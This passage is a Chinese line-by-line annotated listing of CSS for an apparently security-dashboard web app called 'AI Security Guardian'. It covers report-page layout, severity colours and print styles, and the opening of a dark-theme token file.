| 243 | 选择器：指定接下来要设置样式的页面元素。 | `.report-threats {` |
| 244 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 245 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: 1fr 1fr;` |
| 246 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-lg);` |
| 247 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 248 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 249 | 空行：分隔样式规则。 | `&nbsp;` |
| 250 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 767px) {` |
| 251 | 选择器：指定接下来要设置样式的页面元素。 | `  .report-threats {` |
| 252 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: 1fr;` |
| 253 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 254 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 255 | 空行：分隔样式规则。 | `&nbsp;` |
| 256 | 选择器：指定接下来要设置样式的页面元素。 | `.report-chart {` |
| 257 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 258 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--report-border);` |
| 259 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 8px;` |
| 260 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 261 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 262 | 空行：分隔样式规则。 | `&nbsp;` |
| 263 | 选择器：指定接下来要设置样式的页面元素。 | `.report-chart__title {` |
| 264 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 265 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 266 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 267 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.04em;` |
| 268 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-sm);` |
| 269 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 270 | 空行：分隔样式规则。 | `&nbsp;` |
| 271 | 选择器：指定接下来要设置样式的页面元素。 | `.report-chart__body {` |
| 272 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 273 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 260px;` |
| 274 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 275 | 空行：分隔样式规则。 | `&nbsp;` |
| 276 | 样式注释：说明这一段 CSS 的用途。 | `/* 报告表格：无斑马纹、细边框 */` |
| 277 | 选择器：指定接下来要设置样式的页面元素。 | `.report-table {` |
| 278 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 279 | 样式属性：设置 `border-collapse` 的视觉或布局效果。 | `  border-collapse: collapse;` |
| 280 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 281 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 282 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 283 | 空行：分隔样式规则。 | `&nbsp;` |
| 284 | 样式语句：参与页面视觉布局。 | `.report-table th,` |
| 285 | 选择器：指定接下来要设置样式的页面元素。 | `.report-table td {` |
| 286 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: left;` |
| 287 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 10px 12px;` |
| 288 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--report-border);` |
| 289 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 290 | 空行：分隔样式规则。 | `&nbsp;` |
| 291 | 选择器：指定接下来要设置样式的页面元素。 | `.report-table th {` |
| 292 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-surface-alt);` |
| 293 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-secondary);` |
| 294 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 295 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 296 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 297 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.04em;` |
| 298 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 299 | 空行：分隔样式规则。 | `&nbsp;` |
| 300 | 选择器：指定接下来要设置样式的页面元素。 | `.report-table tbody tr:hover {` |
| 301 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-surface);` |
| 302 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 303 | 空行：分隔样式规则。 | `&nbsp;` |
| 304 | 选择器：指定接下来要设置样式的页面元素。 | `.report-table .mono {` |
| 305 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 306 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #1D4ED8;` |
| 307 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 308 | 空行：分隔样式规则。 | `&nbsp;` |
| 309 | 样式注释：说明这一段 CSS 的用途。 | `/* 建议条目 */` |
| 310 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations {` |
| 311 | 样式属性：设置 `list-style` 的视觉或布局效果。 | `  list-style: none;` |
| 312 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 313 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 0;` |
| 314 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 315 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 316 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 317 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 318 | 空行：分隔样式规则。 | `&nbsp;` |
| 319 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item {` |
| 320 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 321 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--report-border);` |
| 322 | 样式属性：设置 `border-left-width` 的视觉或布局效果。 | `  border-left-width: 3px;` |
| 323 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 8px;` |
| 324 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 325 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 326 | 空行：分隔样式规则。 | `&nbsp;` |
| 327 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item--critical {` |
| 328 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: #BE185D;` |
| 329 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 330 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item--high {` |
| 331 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: #B91C1C;` |
| 332 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 333 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item--medium {` |
| 334 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: #B45309;` |
| 335 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 336 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item--low {` |
| 337 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: #1D4ED8;` |
| 338 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 339 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__item--info {` |
| 340 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: #047857;` |
| 341 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 342 | 空行：分隔样式规则。 | `&nbsp;` |
| 343 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__title {` |
| 344 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 345 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 346 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 4px;` |
| 347 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 348 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 349 | 空行：分隔样式规则。 | `&nbsp;` |
| 350 | 选择器：指定接下来要设置样式的页面元素。 | `.report-recommendations__body {` |
| 351 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 352 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-secondary);` |
| 353 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 354 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.7;` |
| 355 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 356 | 空行：分隔样式规则。 | `&nbsp;` |
| 357 | 选择器：指定接下来要设置样式的页面元素。 | `.report-footer {` |
| 358 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: center;` |
| 359 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg) 0;` |
| 360 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 361 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 362 | 样式属性：设置 `border-top` 的视觉或布局效果。 | `  border-top: 1px solid var(--report-border);` |
| 363 | 样式属性：设置 `margin-top` 的视觉或布局效果。 | `  margin-top: var(--space-2xl);` |
| 364 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 365 | 空行：分隔样式规则。 | `&nbsp;` |
| 366 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 367 | 样式注释：说明这一段 CSS 的用途。 | ` * 打印样式：A4 + 隐藏 sidebar/topbar/交互按钮` |
| 368 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 369 | 选择器：指定接下来要设置样式的页面元素。 | `@media print {` |
| 370 | 选择器：指定接下来要设置样式的页面元素。 | `  @page {` |
| 371 | 样式属性：设置 `size` 的视觉或布局效果。 | `    size: A4;` |
| 372 | 样式属性：设置 `margin` 的视觉或布局效果。 | `    margin: 18mm 14mm 20mm;` |
| 373 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 374 | 空行：分隔样式规则。 | `&nbsp;` |
| 375 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] body,` |
| 376 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .app-shell,` |
| 377 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .app-main,` |
| 378 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .page-body {` |
| 379 | 样式属性：设置 `background` 的视觉或布局效果。 | `    background: #fff !important;` |
| 380 | 样式属性：设置 `color` 的视觉或布局效果。 | `    color: #000 !important;` |
| 381 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 382 | 空行：分隔样式规则。 | `&nbsp;` |
| 383 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .sidebar,` |
| 384 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .topbar,` |
| 385 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .menu-toggle,` |
| 386 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-toolbar,` |
| 387 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .drawer,` |
| 388 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .drawer-overlay,` |
| 389 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] #ag-toast-container {` |
| 390 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: none !important;` |
| 391 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 392 | 空行：分隔样式规则。 | `&nbsp;` |
| 393 | 样式注释：说明这一段 CSS 的用途。 | `  /* 打印时让主内容占满宽度 */` |
| 394 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .page-body {` |
| 395 | 样式属性：设置 `padding` 的视觉或布局效果。 | `    padding: 0 !important;` |
| 396 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 397 | 空行：分隔样式规则。 | `&nbsp;` |
| 398 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-root {` |
| 399 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `    max-width: none;` |
| 400 | 样式属性：设置 `margin` 的视觉或布局效果。 | `    margin: 0;` |
| 401 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 402 | 空行：分隔样式规则。 | `&nbsp;` |
| 403 | 样式注释：说明这一段 CSS 的用途。 | `  /* 卡片与段落避免跨页拆断 */` |
| 404 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-section,` |
| 405 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-chart,` |
| 406 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-metric,` |
| 407 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-recommendations__item {` |
| 408 | 样式属性：设置 `break-inside` 的视觉或布局效果。 | `    break-inside: avoid;` |
| 409 | 样式属性：设置 `page-break-inside` 的视觉或布局效果。 | `    page-break-inside: avoid;` |
| 410 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 411 | 空行：分隔样式规则。 | `&nbsp;` |
| 412 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-cover {` |
| 413 | 样式属性：设置 `break-after` 的视觉或布局效果。 | `    break-after: auto;` |
| 414 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 415 | 空行：分隔样式规则。 | `&nbsp;` |
| 416 | 样式注释：说明这一段 CSS 的用途。 | `  /* 打印不要背景色（部分打印机会丢墨）*/` |
| 417 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-section__body,` |
| 418 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-metric,` |
| 419 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-chart,` |
| 420 | 样式属性：设置 `` 的视觉或布局效果。 | `  :root[data-theme="report"] .report-table th,` |
| 421 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-recommendations__item {` |
| 422 | 样式属性：设置 `background` 的视觉或布局效果。 | `    background: #fff !important;` |
| 423 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 424 | 空行：分隔样式规则。 | `&nbsp;` |
| 425 | 样式注释：说明这一段 CSS 的用途。 | `  /* 关闭跨页表格的边距抖动 */` |
| 426 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-table {` |
| 427 | 样式属性：设置 `page-break-inside` 的视觉或布局效果。 | `    page-break-inside: auto;` |
| 428 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 429 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-table tr {` |
| 430 | 样式属性：设置 `page-break-inside` 的视觉或布局效果。 | `    page-break-inside: avoid;` |
| 431 | 样式属性：设置 `page-break-after` 的视觉或布局效果。 | `    page-break-after: auto;` |
| 432 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 433 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-table thead {` |
| 434 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: table-header-group;` |
| 435 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 436 | 选择器：指定接下来要设置样式的页面元素。 | `  :root[data-theme="report"] .report-table tfoot {` |
| 437 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: table-footer-group;` |
| 438 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 439 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |

## `web/static/css/theme.css`

- 类型：前端静态资源
- 行数：279

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 2 | 样式注释：说明这一段 CSS 的用途。 | ` * AI Security Guardian — theme.css` |
| 3 | 样式注释：说明这一段 CSS 的用途。 | ` * Phase 7 深色 SOC 主题令牌 + 字体 + 基础排版。` |
| 4 | 样式注释：说明这一段 CSS 的用途。 | ` * 来源：AI-Security-Guardian-DESIGN.md §2 / §3 / §5 / §6 / §7` |
| 5 | 样式注释：说明这一段 CSS 的用途。 | ` * 严禁使用旧 Phase 7 示例的蓝紫赛博配色（#0a0e27 / #00d4ff 等）。` |
| 6 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 7 | 空行：分隔样式规则。 | `&nbsp;` |
| 8 | 选择器：指定接下来要设置样式的页面元素。 | `:root {` |
| 9 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 表面色 -- */` |
| 10 | 样式属性：设置 `--bg-void` 的视觉或布局效果。 | `  --bg-void: #0A0A0B;` |
| 11 | 样式属性：设置 `--surface-dark` 的视觉或布局效果。 | `  --surface-dark: #141416;` |
| 12 | 样式属性：设置 `--surface-mid` 的视觉或布局效果。 | `  --surface-mid: #1C1C1F;` |
| 13 | 样式属性：设置 `--surface-raised` 的视觉或布局效果。 | `  --surface-raised: #252528;` |
| 14 | 空行：分隔样式规则。 | `&nbsp;` |
| 15 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 边框 -- */` |
| 16 | 样式属性：设置 `--border-subtle` 的视觉或布局效果。 | `  --border-subtle: #2A2A2E;` |
| 17 | 样式属性：设置 `--border-default` 的视觉或布局效果。 | `  --border-default: #3A3A3F;` |
| 18 | 空行：分隔样式规则。 | `&nbsp;` |
| 19 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 文本 -- */` |
| 20 | 样式属性：设置 `--text-primary` 的视觉或布局效果。 | `  --text-primary: #E8E8EC;` |
| 21 | 样式属性：设置 `--text-secondary` 的视觉或布局效果。 | `  --text-secondary: #8B8B96;` |
| 22 | 样式属性：设置 `--text-tertiary` 的视觉或布局效果。 | `  --text-tertiary: #5C5C66;` |
| 23 | 空行：分隔样式规则。 | `&nbsp;` |
| 24 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 翠绿强调（安全 / CTA） -- */` |
| 25 | 样式属性：设置 `--accent-emerald` 的视觉或布局效果。 | `  --accent-emerald: #10B981;` |
| 26 | 样式属性：设置 `--accent-emerald-hover` 的视觉或布局效果。 | `  --accent-emerald-hover: #34D399;` |
| 27 | 样式属性：设置 `--accent-emerald-muted` 的视觉或布局效果。 | `  --accent-emerald-muted: #065F46;` |
| 28 | 样式属性：设置 `--accent-emerald-glow` 的视觉或布局效果。 | `  --accent-emerald-glow: rgba(16, 185, 129, 0.15);` |
| 29 | 空行：分隔样式规则。 | `&nbsp;` |
| 30 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 威胁等级色（核心业务语义） -- */` |
| 31 | 样式属性：设置 `--threat-low` 的视觉或布局效果。 | `  --threat-low: #3B82F6;` |
| 32 | 样式属性：设置 `--threat-medium` 的视觉或布局效果。 | `  --threat-medium: #F59E0B;` |
| 33 | 样式属性：设置 `--threat-high` 的视觉或布局效果。 | `  --threat-high: #EF4444;` |
| 34 | 样式属性：设置 `--threat-critical` 的视觉或布局效果。 | `  --threat-critical: #EC4899;` |
| 35 | 空行：分隔样式规则。 | `&nbsp;` |
| 36 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 功能色 -- */` |
| 37 | 样式属性：设置 `--info-blue` 的视觉或布局效果。 | `  --info-blue: #60A5FA;` |
| 38 | 样式属性：设置 `--success-green` 的视觉或布局效果。 | `  --success-green: #10B981;` |
| 39 | 样式属性：设置 `--warning-amber` 的视觉或布局效果。 | `  --warning-amber: #F59E0B;` |
| 40 | 样式属性：设置 `--error-red` 的视觉或布局效果。 | `  --error-red: #EF4444;` |
| 41 | 空行：分隔样式规则。 | `&nbsp;` |
| 42 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 图表色板 -- */` |
| 43 | 样式属性：设置 `--chart-1` 的视觉或布局效果。 | `  --chart-1: #10B981;` |
| 44 | 样式属性：设置 `--chart-2` 的视觉或布局效果。 | `  --chart-2: #3B82F6;` |
| 45 | 样式属性：设置 `--chart-3` 的视觉或布局效果。 | `  --chart-3: #F59E0B;` |
| 46 | 样式属性：设置 `--chart-4` 的视觉或布局效果。 | `  --chart-4: #EF4444;` |
| 47 | 样式属性：设置 `--chart-5` 的视觉或布局效果。 | `  --chart-5: #EC4899;` |
| 48 | 样式属性：设置 `--chart-6` 的视觉或布局效果。 | `  --chart-6: #8B5CF6;` |
| 49 | 空行：分隔样式规则。 | `&nbsp;` |
| 50 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 间距系统（DESIGN.md §5.1）-- */` |
| 51 | 样式属性：设置 `--space-xs` 的视觉或布局效果。 | `  --space-xs: 4px;` |
| 52 | 样式属性：设置 `--space-sm` 的视觉或布局效果。 | `  --space-sm: 8px;` |
| 53 | 样式属性：设置 `--space-md` 的视觉或布局效果。 | `  --space-md: 16px;` |
| 54 | 样式属性：设置 `--space-lg` 的视觉或布局效果。 | `  --space-lg: 24px;` |
| 55 | 样式属性：设置 `--space-xl` 的视觉或布局效果。 | `  --space-xl: 32px;` |
| 56 | 样式属性：设置 `--space-2xl` 的视觉或布局效果。 | `  --space-2xl: 48px;` |
| 57 | 空行：分隔样式规则。 | `&nbsp;` |
| 58 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 圆角 -- */` |
| 59 | 样式属性：设置 `--radius-sm` 的视觉或布局效果。 | `  --radius-sm: 4px;` |
| 60 | 样式属性：设置 `--radius-md` 的视觉或布局效果。 | `  --radius-md: 6px;` |
| 61 | 样式属性：设置 `--radius-lg` 的视觉或布局效果。 | `  --radius-lg: 8px;` |
| 62 | 样式属性：设置 `--radius-xl` 的视觉或布局效果。 | `  --radius-xl: 12px;` |
| 63 | 空行：分隔样式规则。 | `&nbsp;` |
| 64 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 阴影（DESIGN.md §6）-- */` |
| 65 | 样式属性：设置 `--shadow-1` 的视觉或布局效果。 | `  --shadow-1: 0 1px 2px rgba(0, 0, 0, 0.3);` |
| 66 | 样式属性：设置 `--shadow-2` 的视觉或布局效果。 | `  --shadow-2: 0 4px 8px rgba(0, 0, 0, 0.4);` |
| 67 | 样式属性：设置 `--shadow-3` 的视觉或布局效果。 | `  --shadow-3: 0 8px 24px rgba(0, 0, 0, 0.5);` |
| 68 | 样式属性：设置 `--glow-emerald` 的视觉或布局效果。 | `  --glow-emerald: 0 0 20px rgba(16, 185, 129, 0.2);` |
| 69 | 样式属性：设置 `--glow-red` 的视觉或布局效果。 | `  --glow-red: 0 0 20px rgba(239, 68, 68, 0.2);` |
| 70 | 空行：分隔样式规则。 | `&nbsp;` |
| 71 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 布局 -- */` |
| 72 | 样式属性：设置 `--sidebar-width` 的视觉或布局效果。 | `  --sidebar-width: 240px;` |
| 73 | 样式属性：设置 `--sidebar-collapsed` 的视觉或布局效果。 | `  --sidebar-collapsed: 64px;` |
| 74 | 空行：分隔样式规则。 | `&nbsp;` |
| 75 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 字体栈 -- */` |
| 76 | 样式属性：设置 `--font-sans` 的视觉或布局效果。 | `  --font-sans: "Inter", "Segoe UI", system-ui, -apple-system, sans-serif;` |
| 77 | 样式属性：设置 `--font-mono` 的视觉或布局效果。 | `  --font-mono: "JetBrains Mono", "Fira Code", "Cascadia Code", "Consolas",` |
| 78 | 样式语句：参与页面视觉布局。 | `    "Courier New", monospace;` |
| 79 | 空行：分隔样式规则。 | `&nbsp;` |
| 80 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 字号 -- */` |
| 81 | 样式属性：设置 `--fs-display` 的视觉或布局效果。 | `  --fs-display: 30px;` |
| 82 | 样式属性：设置 `--fs-h1` 的视觉或布局效果。 | `  --fs-h1: 24px;` |
| 83 | 样式属性：设置 `--fs-h2` 的视觉或布局效果。 | `  --fs-h2: 20px;` |
| 84 | 样式属性：设置 `--fs-h3` 的视觉或布局效果。 | `  --fs-h3: 16px;` |
| 85 | 样式属性：设置 `--fs-body` 的视觉或布局效果。 | `  --fs-body: 14px;` |
| 86 | 样式属性：设置 `--fs-caption` 的视觉或布局效果。 | `  --fs-caption: 12px;` |
| 87 | 样式属性：设置 `--fs-mono` 的视觉或布局效果。 | `  --fs-mono: 13px;` |
| 88 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 89 | 空行：分隔样式规则。 | `&nbsp;` |
| 90 | 样式注释：说明这一段 CSS 的用途。 | `/* 报告页浅色覆盖会在 reports.css 中通过 :root[data-theme="report"] 启用 */` |
| 91 | 空行：分隔样式规则。 | `&nbsp;` |
| 92 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 93 | 样式注释：说明这一段 CSS 的用途。 | ` * 重置与基础` |
| 94 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 95 | 样式注释：说明这一段 CSS 的用途。 | `*,` |
| 96 | 样式注释：说明这一段 CSS 的用途。 | `*::before,` |
| 97 | 样式注释：说明这一段 CSS 的用途。 | `*::after {` |
| 98 | 样式属性：设置 `box-sizing` 的视觉或布局效果。 | `  box-sizing: border-box;` |
| 99 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 100 | 空行：分隔样式规则。 | `&nbsp;` |
| 101 | 样式语句：参与页面视觉布局。 | `html,` |
| 102 | 选择器：指定接下来要设置样式的页面元素。 | `body {` |
| 103 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 104 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 0;` |
| 105 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 100%;` |
| 106 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 107 | 空行：分隔样式规则。 | `&nbsp;` |
| 108 | 选择器：指定接下来要设置样式的页面元素。 | `body {` |
| 109 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 110 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 111 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-sans);` |
| 112 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 113 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.5;` |
| 114 | 样式属性：设置 `-webkit-font-smoothing` 的视觉或布局效果。 | `  -webkit-font-smoothing: antialiased;` |
| 115 | 样式属性：设置 `-moz-osx-font-smoothing` 的视觉或布局效果。 | `  -moz-osx-font-smoothing: grayscale;` |
| 116 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 117 | 空行：分隔样式规则。 | `&nbsp;` |
| 118 | 选择器：指定接下来要设置样式的页面元素。 | `::selection {` |
| 119 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 120 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 121 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 122 | 空行：分隔样式规则。 | `&nbsp;` |
| 123 | 样式注释：说明这一段 CSS 的用途。 | `/* 滚动条（深色主题配套） */` |
| 124 | 选择器：指定接下来要设置样式的页面元素。 | `::-webkit-scrollbar {` |
| 125 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 10px;` |
| 126 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 10px;` |
| 127 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 128 | 空行：分隔样式规则。 | `&nbsp;` |
| 129 | 选择器：指定接下来要设置样式的页面元素。 | `::-webkit-scrollbar-track {` |
| 130 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 131 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 132 | 空行：分隔样式规则。 | `&nbsp;` |
| 133 | 选择器：指定接下来要设置样式的页面元素。 | `::-webkit-scrollbar-thumb {` |
| 134 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--border-default);` |
| 135 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 6px;` |
| 136 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 137 | 空行：分隔样式规则。 | `&nbsp;` |
| 138 | 选择器：指定接下来要设置样式的页面元素。 | `::-webkit-scrollbar-thumb:hover {` |
| 139 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--text-tertiary);` |
| 140 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
